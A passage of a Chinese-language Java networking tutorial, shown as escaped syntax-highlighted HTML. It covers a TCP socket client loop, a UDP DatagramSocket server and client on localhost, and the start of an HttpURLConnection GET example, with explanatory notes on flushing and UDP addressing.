&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">OutputStream&lt;/span> &lt;span style="color:#111">output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOutputStream&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;disconnected.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">OutputStream&lt;/span> &lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">writer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedWriter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">OutputStreamWriter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">reader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Scanner&lt;/span> &lt;span style="color:#111">scanner&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Scanner&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">in&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[server] &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">reader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readLine&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(;;)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">print&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;gt;&amp;gt;&amp;gt; &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 打印提示
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">scanner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">nextLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 读取一行输入
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">reader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;&amp;lt;&amp;lt; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bye&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意&lt;code>flush()&lt;/code>，不然可能都收不到消息&lt;/p>
&lt;h3 id="socket---udp">Socket - UDP&lt;/h3>
&lt;p>Server&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DatagramSocket&lt;/span> &lt;span style="color:#111">ds&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramSocket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">6666&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 监听指定端口
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(;;)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 无限循环
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 数据缓冲区:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">1024&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">DatagramPacket&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramPacket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">receive&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 收取一个UDP数据包
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 收取到的数据存储在buffer中，由packet.getOffset(), packet.getLength()指定起始位置和长度
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 将其按UTF-8编码转换为String:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getData&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOffset&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLength&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 发送数据:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;ACK&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setData&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>接收UDP数据包之前先要准备缓冲区，并通过&lt;code>DatagramPacket&lt;/code>实现接收&lt;/p>
&lt;p>假设我们收取到的是一个&lt;code>String&lt;/code>，那么，通过&lt;code>DatagramPacket&lt;/code>返回的&lt;code>packet.getOffset()&lt;/code>和&lt;code>packet.getLength()&lt;/code>确定数据在缓冲区的起止位置&lt;/p>
&lt;p>当服务器收到一个DatagramPacket后，通常必须立刻回复一个或多个UDP包，因为客户端地址在DatagramPacket中，每次收到的DatagramPacket可能是不同的客户端，如果不回复，客户端就收不到任何UDP包&lt;/p>
&lt;p>Client&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DatagramSocket&lt;/span> &lt;span style="color:#111">ds&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramSocket&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSoTimeout&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1000&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InetAddress&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getByName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">6666&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 连接指定服务器和端口
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 发送:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBytes&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DatagramPacket&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramPacket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 接收:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">1024&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramPacket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">receive&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getData&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOffset&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">packet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getLength&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ds&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">disconnect&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里的&lt;code>connect&lt;/code>不是真连接，它是为了在客户端的&lt;code>DatagramSocket&lt;/code>实例中保存服务器端的IP和端口号，确保这个&lt;code>DatagramSocket&lt;/code>实例只能往指定的地址和端口发送UDP包，不能往其他地址和端口发送。这么做不是UDP的限制，而是Java内置了安全检查。&lt;/p>
&lt;p>如果客户端希望向两个不同的服务器发送UDP包，那么它必须创建两个&lt;code>DatagramSocket&lt;/code>实例。&lt;/p>
&lt;p>后续的收发数据和服务器端是一致的。通常来说，客户端必须先发UDP包，因为客户端不发UDP包，服务器端就根本不知道客户端的地址和端口号。&lt;/p>
&lt;p>&lt;code>disconnect()&lt;/code>也不是真正地断开连接，它只是清除了客户端&lt;code>DatagramSocket&lt;/code>实例记录的远程服务器地址和端口号，这样，&lt;code>DatagramSocket&lt;/code>实例就可以连接另一个服务器端。&lt;/p>
&lt;h3 id="httpclient">HttpClient&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URL&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://www.example.com/path/to/target?a=1&amp;amp;b=2&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">HttpURLConnection&lt;/span> &lt;span style="color:#111">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">HttpURLConnection&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">openConnection&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setRequestMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setUseCaches&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setConnectTimeout&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">5000&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 请求超时5秒
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 设置HTTP头:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setRequestProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/*&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setRequestProperty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;User-Agent&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Mozilla/5.0 (compatible; MSIE 11; Windows NT 5.1)&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 连接并发送HTTP请求:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 判断HTTP响应是否200:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getResponseCode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#111">200&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bad response&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 获取所有响应Header:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getHeaderFields&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">keySet&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
